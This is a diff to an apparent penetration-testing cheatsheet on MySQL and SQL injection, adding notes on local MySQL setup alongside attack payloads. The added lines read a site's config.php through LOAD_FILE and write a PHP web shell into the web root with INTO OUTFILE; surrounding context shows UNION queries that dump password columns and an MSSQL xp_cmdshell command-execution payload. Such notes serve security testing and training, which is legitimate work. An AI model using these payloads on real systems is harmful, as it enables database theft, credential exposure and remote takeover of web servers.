@@ -13,6 +13,16 @@ mysql -u root -p
 mysql -u root -p'root' -h $ip -P 3306
 mysql -u 'lavita' -p 'lavita' #  lavita db
 ```
+#### If youre getting a bunch of weird errors, try using mycli
+
+#### Reading LOAD_FILE CONTENTS
+
+```sql
+SELECT CONVERT(UNHEX(HEX(LOAD_FILE('/var/www/html/config.php'))) USING utf8);
+
+SELECT User,Password FROM mysql.user UNION SELECT 1,"<?php system($_GET['cmd
+                                      -> ']);?>" INTO OUTFILE "/var/www/html/img/index2.php";
+```
 
 #### Commands
 
@@ -240,6 +250,29 @@ http://site.com/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM
 ' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS-- # Dump data
 ```
 
+#### Start up MYSQL Locally
+
+```bash
+sudo systemctl start mysql
+sudo mysql -u root -p
+```
+
+#### Use .sql file
+
+```bash
+sudo mysql -u root -p > setup.sql
+```
+
+This worked instead for me.
+
+```bash
+sudo mysql -u root -p
+create database test
+use database test
+source /path/to/setup.sql
+```
+
+
 #### SQL Injection Cheatsheet
 This cheatsheet should NOT be conbsiderd as reference but guide to built on, some of the examples below will require modification(s) such as url encode, comments, etc. Before we contiune here is couple good to know SQL functions
 
@@ -406,8 +439,6 @@ Sometimes you'll run into Microsoft SQL server that have `xp_cmdshell` turned on
 meh' exec master..xp_cmdshell '<command here>' --
 ```
 
-Final notes!
-- If you made it this far then you know that most of the SQL command injection examples are based on `MySQL` and I don't plan on making any for `MSSQL` cause I'm lazy
 - Use your proxy of choice to bypass client-side javascript restrictions
 - `order by` clause works only with regular comments such as `--+`
 - Update ASCII range to include special characters if you're going after users table
